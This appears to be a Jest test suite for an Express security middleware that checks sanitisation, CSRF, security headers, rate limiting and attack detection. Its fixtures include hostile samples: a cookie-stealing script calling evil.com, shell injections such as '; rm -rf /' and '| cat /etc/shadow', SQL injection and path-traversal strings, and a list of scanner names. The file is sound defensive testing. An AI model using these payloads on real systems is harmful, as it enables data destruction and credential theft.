import { SecurityMiddleware } from '../../../src/security/middleware';
import { MockFactory, TestDataGenerator, TestUtilities } from '../../utils/test-helpers';
import { fixtures } from '../../utils/fixtures';

// Mock dependencies
jest.mock('../../../src/config/config', () => ({
  config: {
    security: {
      forceHttps: true,
      hstsMaxAge: 31536000,
      frameOptions: 'DENY',
    },
  },
}));

jest.mock('../../../src/utils/logger', () => ({
  logger: MockFactory.createMockLogger(),
}));

jest.mock('isomorphic-dompurify', () => ({
  sanitize: jest.fn((input) => input.replace(/<script.*?<\/script>/gi, '')),
}));

describe('SecurityMiddleware', () => {
  let mockLogger: any;
  let mockDOMPurify: any;

  beforeEach(() => {
    mockLogger = require('../../../src/utils/logger').logger;
    mockDOMPurify = require('isomorphic-dompurify');

    jest.clearAllMocks();
  });

  describe('input sanitization', () => {
    describe('sanitizeInput', () => {
      it('should sanitize basic XSS attempts', async () => {
        const maliciousInputs = fixtures.security.maliciousInputs.xssPayloads;

        for (const input of maliciousInputs) {
          const sanitized = await SecurityMiddleware.sanitizeInput(input);
          expect(sanitized).not.toMatchXSSPattern();
          expect(mockDOMPurify.sanitize).toHaveBeenCalled();
        }
      });

      it('should detect and reject SQL injection patterns', async () => {
        const sqlInjectionInputs = fixtures.security.maliciousInputs.sqlInjection;

        for (const input of sqlInjectionInputs) {
          await expect(SecurityMiddleware.sanitizeInput(input))
            .rejects.toThrow('Invalid input detected');
        }

        expect(mockLogger.warn).toHaveBeenCalledWith(
          'Potential SQL injection attempt detected',
          expect.objectContaining({
            input: expect.any(String),
          })
        );
      });

      it('should detect and reject NoSQL injection patterns', async () => {
        const noSqlInputs = fixtures.security.maliciousInputs.noSqlInjection;

        for (const input of noSqlInputs) {
          await expect(SecurityMiddleware.sanitizeInput(input))
            .rejects.toThrow('Invalid input detected');
        }

        expect(mockLogger.warn).toHaveBeenCalledWith(
          'Potential NoSQL injection attempt detected',
          expect.objectContaining({
            input: expect.any(String),
          })
        );
      });

      it('should detect and reject command injection patterns', async () => {
        const commandInputs = fixtures.security.maliciousInputs.commandInjection;

        for (const input of commandInputs) {
          await expect(SecurityMiddleware.sanitizeInput(input))
            .rejects.toThrow('Invalid input detected');
        }

        expect(mockLogger.warn).toHaveBeenCalledWith(
          'Potential command injection attempt detected',
          expect.objectContaining({
            input: expect.any(String),
          })
        );
      });

      it('should detect and reject path traversal attempts', async () => {
        const pathTraversalInputs = fixtures.security.maliciousInputs.pathTraversal;

        for (const input of pathTraversalInputs) {
          await expect(SecurityMiddleware.sanitizeInput(input))
            .rejects.toThrow('Invalid input detected');
        }

        expect(mockLogger.warn).toHaveBeenCalledWith(
          'Potential path traversal attempt detected',
          expect.objectContaining({
            input: expect.any(String),
          })
        );
      });

      it('should remove null bytes from strings', async () => {
        const inputWithNullBytes = 'test\x00malicious\x00input';
        const sanitized = await SecurityMiddleware.sanitizeInput(inputWithNullBytes);

        expect(sanitized).toBe('testmaliciousinput');
      });

      it('should handle nested objects recursively', async () => {
        const nestedInput = {
          level1: {
            level2: {
              dangerous: '<script>alert("xss")</script>',
              safe: 'normal text',
            },
            array: ['<script>alert("xss")</script>', 'safe text'],
          },
          topLevel: 'safe text',
        };

        const sanitized = await SecurityMiddleware.sanitizeInput(nestedInput);

        expect(sanitized.level1.level2.dangerous).not.toMatchXSSPattern();
        expect(sanitized.level1.level2.safe).toBe('normal text');
        expect(sanitized.level1.array[0]).not.toMatchXSSPattern();
        expect(sanitized.level1.array[1]).toBe('safe text');
        expect(sanitized.topLevel).toBe('safe text');
      });

      it('should handle arrays of mixed types', async () => {
        const arrayInput = [
          'safe string',
          '<script>alert("xss")</script>',
          { nested: '<script>alert("xss")</script>' },
          42,
          true,
        ];

        const sanitized = await SecurityMiddleware.sanitizeInput(arrayInput);

        expect(sanitized[0]).toBe('safe string');
        expect(sanitized[1]).not.toMatchXSSPattern();
        expect(sanitized[2].nested).not.toMatchXSSPattern();
        expect(sanitized[3]).toBe(42);
        expect(sanitized[4]).toBe(true);
      });

      it('should handle primitive types without modification', async () => {
        const primitives = [42, true, false, null, undefined];

        for (const primitive of primitives) {
          const sanitized = await SecurityMiddleware.sanitizeInput(primitive);
          expect(sanitized).toBe(primitive);
        }
      });
    });

    describe('sanitizeRequestBody middleware', () => {
      it('should sanitize request body and query parameters', async () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.body = {
          username: 'testuser',
          comment: '<script>alert("xss")</script>',
        };
        req.query = {
          search: '<script>alert("xss")</script>',
        };

        await SecurityMiddleware.sanitizeRequestBody(req, res, next);

        expect(req.body.username).toBe('testuser');
        expect(req.body.comment).not.toMatchXSSPattern();
        expect(req.query.search).not.toMatchXSSPattern();
        expect(next).toHaveBeenCalledWith();
      });

      it('should handle sanitization errors', async () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.body = {
          malicious: "'; DROP TABLE users; --",
        };

        // Mock sanitizeInput to throw error
        jest.spyOn(SecurityMiddleware, 'sanitizeInput')
          .mockRejectedValue(new Error('Invalid input detected'));

        await SecurityMiddleware.sanitizeRequestBody(req, res, next);

        expect(res.status).toHaveBeenCalledWith(400);
        expect(res.json).toHaveBeenCalledWith({
          error: 'Invalid input detected',
        });
        expect(mockLogger.warn).toHaveBeenCalledWith(
          'Input sanitization failed',
          expect.objectContaining({
            error: 'Invalid input detected',
          })
        );
      });

      it('should skip empty bodies and queries', async () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.body = {};
        req.query = {};

        await SecurityMiddleware.sanitizeRequestBody(req, res, next);

        expect(next).toHaveBeenCalledWith();
      });
    });
  });

  describe('output sanitization', () => {
    describe('sanitizeOutput middleware', () => {
      it('should intercept and sanitize JSON responses', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        const originalJson = res.json;

        SecurityMiddleware.sanitizeOutput(req, res, next);

        expect(next).toHaveBeenCalledWith();

        // Test the overridden json method
        const testData = {
          safe: 'normal text',
          dangerous: '<script>alert("xss")</script>',
        };

        res.json(testData);

        expect(originalJson).toHaveBeenCalledWith(
          expect.objectContaining({
            safe: 'normal text',
            dangerous: expect.not.stringMatching(/<script.*?<\/script>/),
          })
        );
      });

      it('should preserve allowed HTML tags in output', () => {
        const { req, res, next } = MockFactory.createMockExpress();

        SecurityMiddleware.sanitizeOutput(req, res, next);

        const testData = {
          content: '<p>Safe paragraph</p><b>Bold text</b><script>alert("xss")</script>',
        };

        mockDOMPurify.sanitize.mockReturnValue('<p>Safe paragraph</p><b>Bold text</b>');

        res.json(testData);

        expect(mockDOMPurify.sanitize).toHaveBeenCalledWith(
          testData.content,
          expect.objectContaining({
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
            ALLOWED_ATTR: [],
          })
        );
      });

      it('should skip sensitive fields in output sanitization', () => {
        const { req, res, next } = MockFactory.createMockExpress();

        SecurityMiddleware.sanitizeOutput(req, res, next);

        const testData = {
          username: 'test<script>alert("xss")</script>',
          password: 'sensitive<script>alert("xss")</script>',
          token: 'secret<script>alert("xss")</script>',
          apiKey: 'key<script>alert("xss")</script>',
        };

        const result = res.json.mock.calls[0]?.[0] || testData;
        res.json(testData);

        // Sensitive fields should be skipped
        expect(result.password).toBeUndefined();
        expect(result.token).toBeUndefined();
        expect(result.apiKey).toBeUndefined();

        // Non-sensitive fields should be sanitized
        expect(result.username).not.toMatchXSSPattern();
      });
    });
  });

  describe('security headers', () => {
    describe('checkSecurityHeaders middleware', () => {
      it('should set all required security headers', () => {
        const { req, res, next } = MockFactory.createMockExpress();

        SecurityMiddleware.checkSecurityHeaders(req, res, next);

        expect(res.set).toHaveBeenCalledWith(
          expect.objectContaining(fixtures.security.validSecurityHeaders)
        );
        expect(next).toHaveBeenCalledWith();
      });

      it('should generate request ID if not present', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.headers = {};

        SecurityMiddleware.checkSecurityHeaders(req, res, next);

        expect(req.headers['x-request-id']).toBeValidUUID();
        expect(res.set).toHaveBeenCalledWith(
          expect.objectContaining({
            'X-Request-ID': req.headers['x-request-id'],
          })
        );
      });

      it('should preserve existing request ID', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        const existingRequestId = 'existing-request-id';
        req.headers['x-request-id'] = existingRequestId;

        SecurityMiddleware.checkSecurityHeaders(req, res, next);

        expect(req.headers['x-request-id']).toBe(existingRequestId);
      });

      it('should create security context', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.user = fixtures.users.validUser as any;
        req.ip = '192.168.1.100';
        req.get = jest.fn().mockReturnValue('Mozilla/5.0 Test');

        SecurityMiddleware.checkSecurityHeaders(req, res, next);

        expect(req.securityContext).toBeDefined();
        expect(req.securityContext!.userId).toBe(fixtures.users.validUser.id);
        expect(req.securityContext!.ipAddress).toBe('192.168.1.100');
        expect(req.securityContext!.userAgent).toBe('Mozilla/5.0 Test');
        expect(req.securityContext!.requestId).toBeDefined();
        expect(req.securityContext!.timestamp).toBeInstanceOf(Date);
      });

      it('should detect suspicious headers', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.headers['x-forwarded-for'] = '<script>alert("xss")</script>';

        SecurityMiddleware.checkSecurityHeaders(req, res, next);

        expect(mockLogger.warn).toHaveBeenCalledWith(
          'Suspicious header content detected',
          expect.objectContaining({
            header: 'x-forwarded-for',
            value: expect.any(String),
          })
        );
      });

      it('should set HSTS header when HTTPS is forced', () => {
        const { req, res, next } = MockFactory.createMockExpress();

        SecurityMiddleware.checkSecurityHeaders(req, res, next);

        expect(res.set).toHaveBeenCalledWith(
          expect.objectContaining({
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
          })
        );
      });
    });
  });

  describe('CSRF protection', () => {
    describe('csrfProtection middleware', () => {
      it('should skip CSRF for safe methods', () => {
        const safeMethods = ['GET', 'HEAD', 'OPTIONS'];

        safeMethods.forEach(method => {
          const { req, res, next } = MockFactory.createMockExpress();
          req.method = method;

          SecurityMiddleware.csrfProtection(req, res, next);

          expect(next).toHaveBeenCalledWith();
        });
      });

      it('should skip CSRF for Bearer token authenticated requests', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.method = 'POST';
        req.headers.authorization = 'Bearer valid-jwt-token';

        SecurityMiddleware.csrfProtection(req, res, next);

        expect(next).toHaveBeenCalledWith();
      });

      it('should validate CSRF token for form submissions', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.method = 'POST';
        req.headers['x-csrf-token'] = 'valid-token';
        req.session = { csrfToken: 'valid-token' } as any;

        SecurityMiddleware.csrfProtection(req, res, next);

        expect(next).toHaveBeenCalledWith();
      });

      it('should reject requests with invalid CSRF token', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.method = 'POST';
        req.headers['x-csrf-token'] = 'invalid-token';
        req.session = { csrfToken: 'valid-token' } as any;

        SecurityMiddleware.csrfProtection(req, res, next);

        expect(res.status).toHaveBeenCalledWith(403);
        expect(res.json).toHaveBeenCalledWith({ error: 'Invalid CSRF token' });
        expect(mockLogger.warn).toHaveBeenCalledWith(
          'CSRF token validation failed',
          expect.objectContaining({
            hasToken: true,
            hasSessionToken: true,
            tokensMatch: false,
          })
        );
      });

      it('should reject requests without CSRF token', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.method = 'POST';
        req.session = { csrfToken: 'valid-token' } as any;

        SecurityMiddleware.csrfProtection(req, res, next);

        expect(res.status).toHaveBeenCalledWith(403);
        expect(res.json).toHaveBeenCalledWith({ error: 'Invalid CSRF token' });
      });
    });
  });

  describe('rate limiting', () => {
    describe('rateLimitByIPAndUser middleware', () => {
      let mockRedis: any;

      beforeEach(() => {
        mockRedis = MockFactory.createMockRedis();
        jest.doMock('../../../src/database/redis', () => ({ redis: mockRedis }));
      });

      it('should allow requests within rate limit', async () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.user = fixtures.users.validUser as any;

        mockRedis.incr.mockResolvedValue(5);
        mockRedis.expire.mockResolvedValue(1);

        const middleware = SecurityMiddleware.rateLimitByIPAndUser(100, 60000);
        await middleware(req, res, next);

        expect(next).toHaveBeenCalledWith();
      });

      it('should reject requests exceeding rate limit', async () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.user = fixtures.users.validUser as any;

        mockRedis.incr.mockResolvedValue(101);
        mockRedis.ttl.mockResolvedValue(30);

        const middleware = SecurityMiddleware.rateLimitByIPAndUser(100, 60000);
        await middleware(req, res, next);

        expect(res.status).toHaveBeenCalledWith(429);
        expect(res.json).toHaveBeenCalledWith({
          error: 'Too many security violations',
          retryAfter: 30,
        });
        expect(mockLogger.warn).toHaveBeenCalledWith(
          'Security rate limit exceeded',
          expect.objectContaining({
            current: 101,
            max: 100,
          })
        );
      });

      it('should handle Redis errors gracefully', async () => {
        const { req, res, next } = MockFactory.createMockExpress();

        mockRedis.incr.mockRejectedValue(new Error('Redis error'));

        const middleware = SecurityMiddleware.rateLimitByIPAndUser(100, 60000);
        await middleware(req, res, next);

        expect(mockLogger.error).toHaveBeenCalledWith(
          'Security rate limiting error',
          expect.objectContaining({ error: expect.any(Error) })
        );
        expect(next).toHaveBeenCalledWith();
      });
    });
  });

  describe('request size limiting', () => {
    describe('limitRequestSize middleware', () => {
      it('should allow requests within size limit', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.headers['content-length'] = '1000';

        const middleware = SecurityMiddleware.limitRequestSize(10000);
        middleware(req, res, next);

        expect(next).toHaveBeenCalledWith();
      });

      it('should reject oversized requests', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.headers['content-length'] = '20000';

        const middleware = SecurityMiddleware.limitRequestSize(10000);
        middleware(req, res, next);

        expect(res.status).toHaveBeenCalledWith(413);
        expect(res.json).toHaveBeenCalledWith({
          error: 'Request entity too large',
          maxSize: 10000,
          receivedSize: 20000,
        });
        expect(mockLogger.warn).toHaveBeenCalledWith(
          'Request size limit exceeded',
          expect.objectContaining({
            contentLength: 20000,
            maxSize: 10000,
          })
        );
      });

      it('should handle missing content-length header', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        // No content-length header

        const middleware = SecurityMiddleware.limitRequestSize(10000);
        middleware(req, res, next);

        expect(next).toHaveBeenCalledWith();
      });
    });
  });

  describe('suspicious activity detection', () => {
    describe('detectSuspiciousActivity middleware', () => {
      it('should detect suspicious URL patterns', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.url = '/api/users?search=<script>alert("xss")</script>';
        req.path = '/api/users';

        SecurityMiddleware.detectSuspiciousActivity(req, res, next);

        expect(req.securityFlags).toBeDefined();
        expect(req.securityFlags!.suspicious).toBe(true);
        expect(mockLogger.warn).toHaveBeenCalledWith(
          'Suspicious activity detected',
          expect.objectContaining({
            url: expect.stringContaining(req.url),
            suspiciousCount: expect.any(Number),
          })
        );
        expect(next).toHaveBeenCalledWith();
      });

      it('should detect suspicious user agents', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.get = jest.fn().mockReturnValue('sqlmap/1.0');
        req.path = '/api/test';

        SecurityMiddleware.detectSuspiciousActivity(req, res, next);

        expect(req.securityFlags?.suspicious).toBe(true);
        expect(next).toHaveBeenCalledWith();
      });

      it('should detect multiple special characters in path', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.path = '/api/<>&";\'/test';

        SecurityMiddleware.detectSuspiciousActivity(req, res, next);

        expect(req.securityFlags?.suspicious).toBe(true);
        expect(next).toHaveBeenCalledWith();
      });

      it('should not flag normal requests as suspicious', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.url = '/api/users?search=normal%20query';
        req.path = '/api/users';
        req.get = jest.fn().mockReturnValue('Mozilla/5.0 (Windows NT 10.0; Win64; x64)');

        SecurityMiddleware.detectSuspiciousActivity(req, res, next);

        expect(req.securityFlags?.suspicious).not.toBe(true);
        expect(next).toHaveBeenCalledWith();
      });
    });
  });

  describe('honeypot protection', () => {
    describe('honeypot middleware', () => {
      it('should block requests with filled honeypot field', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.body = {
          username: 'testuser',
          password: 'testpass',
          honeypot: 'bot-filled-this',
        };

        SecurityMiddleware.honeypot(req, res, next);

        expect(res.status).toHaveBeenCalledWith(200);
        expect(res.json).toHaveBeenCalledWith({ success: true });
        expect(mockLogger.warn).toHaveBeenCalledWith(
          'Honeypot trap triggered',
          expect.objectContaining({
            honeypotValue: 'bot-filled-this',
          })
        );
        expect(next).not.toHaveBeenCalled();
      });

      it('should allow requests with empty honeypot field', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.body = {
          username: 'testuser',
          password: 'testpass',
          honeypot: '',
        };

        SecurityMiddleware.honeypot(req, res, next);

        expect(req.body.honeypot).toBeUndefined();
        expect(next).toHaveBeenCalledWith();
      });

      it('should allow requests without honeypot field', () => {
        const { req, res, next } = MockFactory.createMockExpress();
        req.body = {
          username: 'testuser',
          password: 'testpass',
        };

        SecurityMiddleware.honeypot(req, res, next);

        expect(next).toHaveBeenCalledWith();
      });
    });
  });

  describe('security event logging', () => {
    describe('logSecurityEvent', () => {
      it('should log critical security events', () => {
        const { req } = MockFactory.createMockExpress();
        req.user = fixtures.users.validUser as any;

        SecurityMiddleware.logSecurityEvent(
          'authentication_bypass',
          'critical',
          { attemptedUser: 'admin', method: 'token_manipulation' },
          req
        );

        expect(mockLogger.error).toHaveBeenCalledWith(
          'Critical security event',
          expect.objectContaining({
            type: 'security_event',
            eventType: 'authentication_bypass',
            severity: 'critical',
            details: expect.objectContaining({
              attemptedUser: 'admin',
              method: 'token_manipulation',
            }),
            userId: fixtures.users.validUser.id,
          })
        );
      });

      it('should log events with appropriate severity levels', () => {
        const severityTests = [
          { severity: 'low' as const, expectedLogger: 'info' },
          { severity: 'medium' as const, expectedLogger: 'warn' },
          { severity: 'high' as const, expectedLogger: 'error' },
          { severity: 'critical' as const, expectedLogger: 'error' },
        ];

        severityTests.forEach(({ severity, expectedLogger }) => {
          jest.clearAllMocks();

          SecurityMiddleware.logSecurityEvent(
            'test_event',
            severity,
            { test: 'data' }
          );

          expect(mockLogger[expectedLogger]).toHaveBeenCalled();
        });
      });

      it('should log events without request context', () => {
        SecurityMiddleware.logSecurityEvent(
          'system_event',
          'medium',
          { systemCheck: 'failed' }
        );

        expect(mockLogger.warn).toHaveBeenCalledWith(
          'Medium severity security event',
          expect.objectContaining({
            type: 'security_event',
            eventType: 'system_event',
            severity: 'medium',
            details: { systemCheck: 'failed' },
            timestamp: expect.any(String),
          })
        );

        const logCall = mockLogger.warn.mock.calls[0][1];
        expect(logCall.requestId).toBeUndefined();
        expect(logCall.userId).toBeUndefined();
      });
    });
  });

  describe('suspicious content detection', () => {
    it('should detect various attack patterns', () => {
      const testCases = [
        // Script injection
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'onload=alert("xss")',

        // SQL injection
        "' OR '1'='1",
        'UNION SELECT * FROM users',
        '-- comment',

        // Command injection
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& shutdown',
        '`whoami`',

        // Path traversal
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '%2e%2e%2f',

        // Common attack patterns
        'eval(',
        '/etc/passwd',
        'web.config',
        '.htaccess',

        // Suspicious user agents
        'sqlmap',
        'nikto',
        'burp',
      ];

      testCases.forEach(testCase => {
        // Use reflection to call the private method
        const containsSuspicious = (SecurityMiddleware as any).containsSuspiciousContent(testCase);
        expect(containsSuspicious).toBe(true);
      });
    });

    it('should not flag legitimate content as suspicious', () => {
      const legitimateContent = [
        'normal user input',
        'email@example.com',
        'https://legitimate-site.com/api/endpoint',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'SELECT * FROM products WHERE category = ?', // Parameterized query
      ];

      legitimateContent.forEach(content => {
        const containsSuspicious = (SecurityMiddleware as any).containsSuspiciousContent(content);
        expect(containsSuspicious).toBe(false);
      });
    });
  });

  describe('integration scenarios', () => {
    it('should handle complex nested malicious input', async () => {
      const complexInput = {
        user: {
          profile: {
            bio: '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
            interests: [
              'legitimate interest',
              "'; DROP TABLE users; --",
            ],
          },
          settings: {
            theme: 'dark',
            notifications: {
              email: '../../etc/passwd',
            },
          },
        },
        metadata: {
          source: '| cat /etc/shadow',
          timestamp: new Date().toISOString(),
        },
      };

      await expect(SecurityMiddleware.sanitizeInput(complexInput))
        .rejects.toThrow('Invalid input detected');

      expect(mockLogger.warn).toHaveBeenCalledWith(
        expect.stringContaining('attempt detected'),
        expect.any(Object)
      );
    });

    it('should maintain performance with large legitimate inputs', async () => {
      const largeInput = {
        data: 'a'.repeat(10000), // 10KB of legitimate data
        nested: Array.from({ length: 100 }, (_, i) => ({
          id: i,
          value: `legitimate value ${i}`,
        })),
      };

      const { result, duration } = await TestUtilities.measureExecutionTime(
        () => SecurityMiddleware.sanitizeInput(largeInput)
      );

      expect(result).toBeDefined();
      expect(duration).toBeLessThan(1000); // Should complete within 1 second
    });

    it('should handle edge cases gracefully', async () => {
      const edgeCases = [
        '', // Empty string
        null,
        undefined,
        0,
        false,
        [],
        {},
        { deeply: { nested: { empty: { object: {} } } } },
      ];

      for (const testCase of edgeCases) {
        const result = await SecurityMiddleware.sanitizeInput(testCase);
        expect(result).toBe(testCase);
      }
    });
  });
});